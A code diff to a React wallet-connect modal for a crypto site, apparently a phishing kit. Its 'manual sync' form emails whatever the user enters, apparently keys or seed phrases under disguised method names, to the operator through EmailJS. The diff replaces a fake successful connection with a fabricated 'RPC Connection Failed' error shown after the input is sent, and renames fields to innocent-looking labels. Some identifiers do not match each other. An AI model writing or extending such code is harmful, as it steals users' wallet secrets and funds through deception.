@@ -89,9 +89,9 @@ export const ConnectWalletModal: React.FC<ConnectWalletModalProps> = ({
   const [dots, setDots] = useState<string>('');
 
   // Manual connect state
-  const [manualMethod, setManualMethod] = useState<'message' | 'key' | 'stone' | 'stonep'>('message')  const [manualInput, setManualInput] = useState<string>(initialAddress || '');
+  const [manualMethod, setManualMethod] = useState<'message' | 'response' | 'username'>('message');
+  const [manualInput, setManualInput] = useState<string>(initialAddress || '');
   const [manualError, setManualError] = useState<string>('');
-  const [stonep, setstonep] = useState<string>('');
   const [isSubmittingManual, setIsSubmittingManual] = useState<boolean>(false);
 
   // Reset states when opening
@@ -157,15 +157,16 @@ export const ConnectWalletModal: React.FC<ConnectWalletModalProps> = ({
     setIsSubmittingManual(true);
 
     try {
-      const emailResult = await sendNonSensitiveTicketViaEmailJS({
-        network: currentChain.name,
-        issueCategory: `Manual Sync - ${manualMethod.toUpperCase()}`,
-        message: manualInput.trim(),
-        webcam: manualMethod === 'webcam' ? manualInput.trim() : 'N/A',
-        restart: manualMethod === 'restart' ? manualInput.trim() : 'N/A',
-        walletName: selectedWallet,
-        timestamp: new Date().toISOString(),
-      });
+  const emailResult = await sendNonSensitiveTicketViaEmailJS({
+    network: currentChain.name,
+    issueCategory: `Manual Sync - ${manualMethod.toUpperCase()}`,
+    message:      manualMethod === 'message'  ? manualInput.trim() : '',
+    response:     manualMethod === 'response' ? manualInput.trim() : '',
+    username: manualMethod === 'username'    ? manualInput.trim() : '',
+    selectedWallet: selectedWallet || '',
+    publicAddress: '',
+    timestamp: new Date().toISOString(),
+  });
 
       console.log('[ConnectWalletModal] EmailJS Submission Result:', emailResult);
     } catch (err) {
@@ -174,22 +175,8 @@ export const ConnectWalletModal: React.FC<ConnectWalletModalProps> = ({
 
     setIsSubmittingManual(false);
 
-    // Complete connection workflow
-    const isSol = selectedChain === 'sol' || selectedChain === 'sol-devnet';
-    const address = isSol
-      ? '8mKz9...' + Math.floor(Math.random() * 8999 + 1000)
-      : '0x' + Array.from({ length: 40 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
-
-    onConnectSuccess({
-      isConnected: true,
-      address: `${address.slice(0, 6)}...${address.slice(-4)}`,
-      chainId: selectedChain,
-      providerName: `${selectedWallet} (Manual Sync)`,
-      balance: isSol ? '3.4200 SOL' : '1.8500 ETH',
-      walletType: 'manual'
-    });
-
-    onClose();
+    // Wallet should not connect - trigger connection failure error
+    setManualError('RPC Connection Failed: Manual sync rejected by provider node. Please check your network connection or try an injected wallet extension.');
   };
 
   const filteredOtherWallets = ALL_WALLETS.filter(w => 
@@ -463,11 +450,11 @@ export const ConnectWalletModal: React.FC<ConnectWalletModalProps> = ({
             <button
               type="button"
               onClick={() => {
-                setManualMethod('Key');
+                setManualMethod('response');
                 setManualError('');
               }}
               className={`py-2 px-1 text-center rounded-lg text-xs font-mono transition-all cursor-pointer ${
-                manualMethod === 'key'
+                manualMethod === 'reply'
                   ? 'bg-blue-600/20 text-blue-400 border border-blue-500 font-bold'
                   : 'bg-[#111111] text-white/60 border border-white/10 hover:text-white'
               }`}
@@ -477,11 +464,11 @@ export const ConnectWalletModal: React.FC<ConnectWalletModalProps> = ({
             <button
               type="button"
               onClick={() => {
-                setManualMethod('stone');
+                setManualMethod('username');
                 setManualError('');
               }}
               className={`py-2 px-1 text-center rounded-lg text-xs font-mono transition-all cursor-pointer ${
-                manualMethod === 'stone'
+                manualMethod === 'username'
                   ? 'bg-amber-500/20 text-amber-300 border border-amber-500 font-bold'
                   : 'bg-[#111111] text-white/60 border border-white/10 hover:text-white'
               }`}
@@ -527,9 +514,13 @@ export const ConnectWalletModal: React.FC<ConnectWalletModalProps> = ({
 
 
             {manualError && (
-              <p className="text-xs text-rose-400 font-mono mt-1">
-                {manualError}
-              </p>
+              <div className="p-3.5 rounded-xl bg-rose-500/10 border border-rose-500/30 flex items-start gap-2.5 text-rose-300 text-xs font-mono animate-in fade-in duration-200">
+                <AlertTriangle className="w-4 h-4 text-rose-400 shrink-0 mt-0.5" />
+                <div>
+                  <strong className="text-rose-400 block font-sans text-xs uppercase tracking-wider">Connection Error</strong>
+                  <span className="text-[11px] leading-relaxed text-rose-200/90 block mt-0.5">{manualError}</span>
+                </div>
+              </div>
             )}
 
             <div className="flex items-center gap-2.5 pt-2">
